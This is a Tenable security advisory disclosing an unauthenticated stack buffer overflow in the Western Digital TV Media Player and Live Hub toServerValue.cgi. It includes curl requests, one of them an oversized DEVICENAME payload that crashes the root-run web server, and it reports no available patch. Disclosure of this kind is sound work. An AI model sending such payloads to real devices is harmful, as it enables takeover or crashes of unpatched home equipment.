# [R1] Western Digital TV Media Player and Live Hub Unauthenticated RCE

Critical

[← View More Research Advisories](/security/research)
### Synopsis

Tenable discovered an unauthenticated stack buffer overflow in the Western Digital TV Media Player and Live Hub Media Center products. Tenable discovered this vulnerability while analyzing [SEC Consult's Western Digital TV Media Player security advisory](https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20170518-0_WDTV_Media_Player_Multiple_critical_vulnerabilities_v10.txt).

A common idiom used throughout the WD Media device web interface is to respond with a 403 Forbidden error to any request that is not from the LAN. However, this restriction doesn't appear to apply to the cgi scripts in */cgi-bin/*. One of these cgi scripts processes JSON data that is sent to it. For example, the following request changes the device's name:

```
albinolobster@ubuntu:~$ curl -v -d '{ "DEVICENAME": "lol" }' http://192.168.1.93/cgi-bin/toServerValue.cgi
*   Trying 192.168.1.93...
* Connected to 192.168.1.93 (192.168.1.93) port 80 (#0)
> POST /cgi-bin/toServerValue.cgi HTTP/1.1
> Host: 192.168.1.93
> User-Agent: curl/7.47.0
> Accept: */*
> Content-Length: 23
> Content-Type: application/x-www-form-urlencoded
>
* upload completely sent off: 23 out of 23 bytes
< HTTP/1.1 200 OK
< Date: Mon, 9 Oct 2017 20:09:22 GMT
< Server: Apache
< Debug: haha
< X-Orion-Version: 1.0
< Transfer-Encoding: chunked
< Content-Type: text/html;charset=iso-8859-1;debug:[{ "DEVICENAME": "lol" }]
<
{ "success": 1 }
* Connection #0 to host 192.168.1.93 left intact

```

When a large string is placed in the device name field a stack buffer overflow occurs. As such this request:

```

curl -v -d '{"DEVICENAME":"WDLIVETVaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAA"}' http://192.168.1.93/cgi-bin/toServerValue.cgi

```

Results in the following crash:

```

      00000000 00739300

```
The HTTP server is configured to run as root. As such, this stack buffer overflow can result in a complete compromise of the target device.

### Solution

No solution current exists. A number of vulnerabilities in these devices have gone unpatched. If you are continuing to use these devices then it is best to isolate them as much as possible.
